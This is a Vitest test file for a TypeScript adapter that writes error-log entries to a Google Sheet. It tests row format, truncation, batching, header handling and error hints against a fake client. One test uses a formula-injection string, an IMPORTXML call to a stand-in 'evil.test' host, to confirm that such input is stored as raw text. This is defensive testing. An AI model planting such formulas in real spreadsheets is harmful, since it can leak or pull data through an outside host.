import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { BatchingErrorAdapter } from '@richardmcquiston01/error-log-adapter';
import type { ErrorLogEntry } from '@richardmcquiston01/error-log-adapter';
import {
  GoogleSheetsErrorAdapter,
  MAX_CELL_LENGTH,
  SHEET_COLUMNS,
  buildSheetHeaderRow,
} from './google-sheets-error-adapter.js';
import type {
  SheetsAppendParamsLike,
  SheetsClientLike,
  SheetsGetParamsLike,
  SheetsUpdateParamsLike,
  SheetsValueRangeLike,
} from './google-sheets-error-adapter.js';

interface Fake {
  client: SheetsClientLike;
  appends: SheetsAppendParamsLike[];
  gets: SheetsGetParamsLike[];
  updates: SheetsUpdateParamsLike[];
}

interface FakeOptions {
  firstRow?: unknown[][] | null;
  append?: (params: SheetsAppendParamsLike) => Promise<unknown>;
  get?: (
    params: SheetsGetParamsLike
  ) => Promise<{ data: SheetsValueRangeLike }>;
  update?: (params: SheetsUpdateParamsLike) => Promise<unknown>;
}

function fakeClient(options: FakeOptions = {}): Fake {
  const appends: SheetsAppendParamsLike[] = [];
  const gets: SheetsGetParamsLike[] = [];
  const updates: SheetsUpdateParamsLike[] = [];
  const client: SheetsClientLike = {
    spreadsheets: {
      values: {
        async append(params: SheetsAppendParamsLike): Promise<unknown> {
          appends.push(params);
          return options.append === undefined ? {} : options.append(params);
        },
        async get(
          params: SheetsGetParamsLike
        ): Promise<{ data: SheetsValueRangeLike }> {
          gets.push(params);
          return options.get === undefined
            ? { data: { values: options.firstRow ?? null } }
            : options.get(params);
        },
        async update(params: SheetsUpdateParamsLike): Promise<unknown> {
          updates.push(params);
          return options.update === undefined ? {} : options.update(params);
        },
      },
    },
  };
  return { client, appends, gets, updates };
}

const SPREADSHEET_ID = '1AbCdEfGhIjKlMnOpQrStUvWxYz';

const entry: ErrorLogEntry = {
  code: 'DB_DOWN',
  message: 'cannot reach the database',
  source: 'checkout',
  cause: new Error('ECONNREFUSED'),
  timestamp: '2026-10-19T05:00:00.123Z',
  id: '3f2b8c1e-5a7d-4e21-9c0a-1b2c3d4e5f60',
};

/** An error shaped like the ones the Google client throws. */
function apiError(status: unknown, message: string, field = 'code'): Error {
  return Object.assign(new Error(message), { [field]: status });
}

beforeEach(() => {
  vi.spyOn(console, 'error').mockImplementation(() => undefined);
});
afterEach(() => {
  vi.restoreAllMocks();
});

describe('GoogleSheetsErrorAdapter', () => {
  it('appends one row with the six columns, as raw text, below the last row', async () => {
    const { client, appends } = fakeClient();

    const result = await new GoogleSheetsErrorAdapter(
      client,
      SPREADSHEET_ID
    ).log(entry);

    expect(result).toEqual({ ok: true });
    expect(appends).toHaveLength(1);
    const call = appends[0] as SheetsAppendParamsLike;
    expect(call.spreadsheetId).toBe(SPREADSHEET_ID);
    expect(call.range).toBe("'error_log'!A:F");
    expect(call.valueInputOption).toBe('RAW');
    expect(call.insertDataOption).toBe('INSERT_ROWS');
    const row = call.requestBody.values[0] as string[];
    expect(row).toHaveLength(SHEET_COLUMNS.length);
    expect(row.slice(0, 5)).toEqual([
      '3f2b8c1e-5a7d-4e21-9c0a-1b2c3d4e5f60',
      '2026-10-19T05:00:00.123Z',
      'DB_DOWN',
      'cannot reach the database',
      'checkout',
    ]);
    const cause = JSON.parse(row[5] as string) as {
      name: string;
      message: string;
    };
    expect(cause).toMatchObject({ name: 'Error', message: 'ECONNREFUSED' });
  });

  it('leaves source and cause empty when there are none, and makes an id and a time', async () => {
    const { client, appends } = fakeClient();

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID).log({
      code: 'E',
      message: 'm',
    });

    const row = (appends[0] as SheetsAppendParamsLike).requestBody
      .values[0] as string[];
    expect(row[0]).toMatch(/^[0-9a-f-]{36}$/);
    expect(row[1]).toMatch(/^\d{4}-\d\d-\d\dT/);
    expect(row.slice(4)).toEqual(['', '']);
  });

  it('sends a message that looks like a formula unchanged, as RAW text', async () => {
    const { client, appends } = fakeClient();

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID).log({
      ...entry,
      message: '=IMPORTXML("https://evil.test","//a")',
    });

    const call = appends[0] as SheetsAppendParamsLike;
    expect(call.valueInputOption).toBe('RAW');
    expect((call.requestBody.values[0] as string[])[3]).toBe(
      '=IMPORTXML("https://evil.test","//a")'
    );
  });

  it('quotes a tab name, doubling any apostrophe', async () => {
    const { client, appends } = fakeClient();

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID, {
      sheetName: "Bob's errors",
    }).log(entry);

    expect((appends[0] as SheetsAppendParamsLike).range).toBe(
      "'Bob''s errors'!A:F"
    );
  });

  it('cuts a message and a cause to the cell limit and says so', async () => {
    const { client, appends } = fakeClient();

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID).log({
      ...entry,
      message: 'm'.repeat(MAX_CELL_LENGTH + 10),
      cause: 'c'.repeat(MAX_CELL_LENGTH * 2),
    });

    const row = (appends[0] as SheetsAppendParamsLike).requestBody
      .values[0] as string[];
    expect(row[3]).toHaveLength(MAX_CELL_LENGTH);
    expect(row[3]?.endsWith('… (truncated)')).toBe(true);
    expect(row[5]).toHaveLength(MAX_CELL_LENGTH);
    expect(row[5]?.endsWith('… (truncated)')).toBe(true);
  });

  it('does not cut an emoji in half', async () => {
    const { client, appends } = fakeClient();

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID).log({
      ...entry,
      message: '😀'.repeat(MAX_CELL_LENGTH),
    });

    const message = (
      (appends[0] as SheetsAppendParamsLike).requestBody.values[0] as string[]
    )[3] as string;
    expect(message.length).toBeLessThanOrEqual(MAX_CELL_LENGTH);
    expect(message).not.toMatch(/[\ud800-\udbff](?![\udc00-\udfff])/);
  });

  it('rejects an entry with an invalid id without calling Sheets', async () => {
    const { client, appends } = fakeClient();

    const result = await new GoogleSheetsErrorAdapter(
      client,
      SPREADSHEET_ID
    ).log({ ...entry, id: 'not-a-uuid' });

    expect(result.ok).toBe(false);
    expect(result.error).toContain('UUID');
    expect(appends).toHaveLength(0);
  });

  it('returns ok: false, never throws, when Sheets rejects', async () => {
    const { client } = fakeClient({
      append: () => Promise.reject(new Error('socket hang up')),
    });

    const result = await new GoogleSheetsErrorAdapter(
      client,
      SPREADSHEET_ID
    ).log(entry);

    expect(result).toEqual({
      ok: false,
      error:
        'GoogleSheetsErrorAdapter failed to append to tab "error_log": socket hang up',
    });
    expect(console.error).toHaveBeenCalledTimes(1);
  });

  it('returns ok: false when Sheets does not answer in time', async () => {
    const { client } = fakeClient({
      append: () => new Promise(() => undefined),
    });

    const result = await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID, {
      timeoutMs: 20,
    }).log(entry);

    expect(result.ok).toBe(false);
    expect(result.error).toContain(
      'Google Sheets did not respond within 20 ms'
    );
  });

  it('uses the prefix option in the console message', async () => {
    const { client } = fakeClient({
      append: () => Promise.reject(new Error('boom')),
    });

    await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID, {
      prefix: '[my-app]',
    }).log(entry);

    expect(console.error).toHaveBeenCalledWith(
      '[my-app] GoogleSheetsErrorAdapter:',
      expect.any(Error)
    );
  });

  describe('constructor', () => {
    it('rejects an empty spreadsheet ID', () => {
      expect(
        () => new GoogleSheetsErrorAdapter(fakeClient().client, '  ')
      ).toThrow('spreadsheetId must not be empty');
    });

    it('rejects an empty tab name', () => {
      expect(
        () =>
          new GoogleSheetsErrorAdapter(fakeClient().client, SPREADSHEET_ID, {
            sheetName: '',
          })
      ).toThrow('sheetName must not be empty');
    });

    it('rejects an invalid timeout', () => {
      expect(
        () =>
          new GoogleSheetsErrorAdapter(fakeClient().client, SPREADSHEET_ID, {
            timeoutMs: 0,
          })
      ).toThrow('timeoutMs must be a positive number');
    });
  });

  describe('logBatch', () => {
    it('appends every entry in one request, in order', async () => {
      const { client, appends } = fakeClient();
      const adapter = new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID);

      const result = await adapter.logBatch([
        { ...entry, message: 'first' },
        { ...entry, message: 'second', id: undefined },
        { ...entry, message: 'third', id: undefined },
      ]);

      expect(result).toEqual({ ok: true });
      expect(appends).toHaveLength(1);
      const rows = (appends[0] as SheetsAppendParamsLike).requestBody.values;
      expect(rows.map((row: string[]) => row[3])).toEqual([
        'first',
        'second',
        'third',
      ]);
    });

    it('sends nothing for an empty batch', async () => {
      const { client, appends } = fakeClient();

      const result = await new GoogleSheetsErrorAdapter(
        client,
        SPREADSHEET_ID
      ).logBatch([]);

      expect(result).toEqual({ ok: true });
      expect(appends).toHaveLength(0);
    });

    it('writes nothing when one entry cannot be prepared, and says which', async () => {
      const { client, appends } = fakeClient();

      const result = await new GoogleSheetsErrorAdapter(
        client,
        SPREADSHEET_ID
      ).logBatch([entry, { ...entry, id: 'nope' }]);

      expect(result.ok).toBe(false);
      expect(result.error).toContain('to append 2 entries to tab "error_log"');
      expect(result.error).toContain(
        'entry 1 could not be prepared, so nothing was written'
      );
      expect(appends).toHaveLength(0);
    });

    it('is used by BatchingErrorAdapter to send a whole batch as one append', async () => {
      const { client, appends } = fakeClient();
      const batching = new BatchingErrorAdapter(
        new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID),
        { batchSize: 3, maxWaitMs: 60_000 }
      );

      await batching.log({ ...entry, message: 'a', id: undefined });
      await batching.log({ ...entry, message: 'b', id: undefined });
      await batching.log({ ...entry, message: 'c', id: undefined });
      await batching.flush();

      expect(appends).toHaveLength(1);
      expect(
        (appends[0] as SheetsAppendParamsLike).requestBody.values
      ).toHaveLength(3);
    });
  });

  describe('header row', () => {
    it('is left alone by default', async () => {
      const { client, gets, updates } = fakeClient();

      await new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID).log(entry);

      expect(gets).toHaveLength(0);
      expect(updates).toHaveLength(0);
    });

    it('is written once, when the first row is empty', async () => {
      const { client, gets, updates, appends } = fakeClient({ firstRow: null });
      const adapter = new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID, {
        writeHeader: true,
      });

      await Promise.all([adapter.log(entry), adapter.log(entry)]);
      await adapter.log(entry);

      expect(gets).toHaveLength(1);
      expect((gets[0] as SheetsGetParamsLike).range).toBe("'error_log'!A1:F1");
      expect(updates).toHaveLength(1);
      expect(updates[0]).toEqual({
        spreadsheetId: SPREADSHEET_ID,
        range: "'error_log'!A1:F1",
        valueInputOption: 'RAW',
        requestBody: {
          values: [['id', 'occurred_at', 'code', 'message', 'source', 'cause']],
        },
      });
      expect(appends).toHaveLength(3);
    });

    it('is never changed when the first row already has something in it', async () => {
      const { client, updates, appends } = fakeClient({
        firstRow: [['my', 'own', 'headers']],
      });

      const result = await new GoogleSheetsErrorAdapter(
        client,
        SPREADSHEET_ID,
        { writeHeader: true }
      ).log(entry);

      expect(result).toEqual({ ok: true });
      expect(updates).toHaveLength(0);
      expect(appends).toHaveLength(1);
    });

    it('is tried again on the next call after a failure, and the entry is not written meanwhile', async () => {
      let failures = 1;
      const { client, updates, appends } = fakeClient({
        firstRow: null,
        get: async () => {
          if (failures > 0) {
            failures -= 1;
            throw apiError(400, 'Unable to parse range: error_log!A1:F1');
          }
          return { data: { values: null } };
        },
      });
      const adapter = new GoogleSheetsErrorAdapter(client, SPREADSHEET_ID, {
        writeHeader: true,
      });

      const first = await adapter.log(entry);
      const second = await adapter.log(entry);

      expect(first.ok).toBe(false);
      expect(first.error).toContain('has no tab named "error_log"');
      expect(second).toEqual({ ok: true });
      expect(updates).toHaveLength(1);
      expect(appends).toHaveLength(1);
    });

    it('fails the entry when the header cannot be written', async () => {
      const { client, appends } = fakeClient({
        update: () => Promise.reject(new Error('read-only')),
      });

      const result = await new GoogleSheetsErrorAdapter(
        client,
        SPREADSHEET_ID,
        { writeHeader: true }
      ).log(entry);

      expect(result.ok).toBe(false);
      expect(result.error).toContain('read-only');
      expect(appends).toHaveLength(0);
    });

    it('builds the same names the columns constant lists', () => {
      expect(buildSheetHeaderRow()).toEqual([...SHEET_COLUMNS]);
    });
  });

  describe('failure hints', () => {
    async function failureFor(error: unknown): Promise<string> {
      const { client } = fakeClient({
        append: () => Promise.reject(error),
      });
      const result = await new GoogleSheetsErrorAdapter(
        client,
        SPREADSHEET_ID,
        { sheetName: 'Errors' }
      ).log(entry);
      return result.error ?? '';
    }

    it('explains the rate limit and points at batching', async () => {
      const message = await failureFor(
        apiError(429, 'Quota exceeded for quota metric')
      );

      expect(message).toContain('Quota exceeded for quota metric');
      expect(message).toContain('about 60 writes per minute per user');
      expect(message).toContain('BatchingErrorAdapter');
    });

    it('reads the status from a string code, a status field or a response', async () => {
      for (const error of [
        apiError('429', 'slow down'),
        apiError(429, 'slow down', 'status'),
        Object.assign(new Error('slow down'), { response: { status: 429 } }),
      ]) {
        expect(await failureFor(error)).toContain('BatchingErrorAdapter');
      }
    });

    it('explains a permission failure', async () => {
      const message = await failureFor(
        apiError(403, 'The caller does not have permission')
      );

      expect(message).toContain('The caller does not have permission');
      expect(message).toContain('share it with that account');
    });

    it('explains a missing spreadsheet', async () => {
      expect(
        await failureFor(apiError(404, 'Requested entity was not found.'))
      ).toContain('check the spreadsheet ID');
    });

    it('names the tab when the range cannot be parsed', async () => {
      expect(
        await failureFor(apiError(400, 'Unable to parse range: Errors!A:F'))
      ).toContain('has no tab named "Errors"');
    });

    it('adds nothing to other errors', async () => {
      expect(await failureFor(apiError('ECONNRESET', 'socket hang up'))).toBe(
        'GoogleSheetsErrorAdapter failed to append to tab "Errors": socket hang up'
      );
      expect(await failureFor(apiError(400, 'Invalid value at values'))).toBe(
        'GoogleSheetsErrorAdapter failed to append to tab "Errors": Invalid value at values'
      );
    });
  });
});
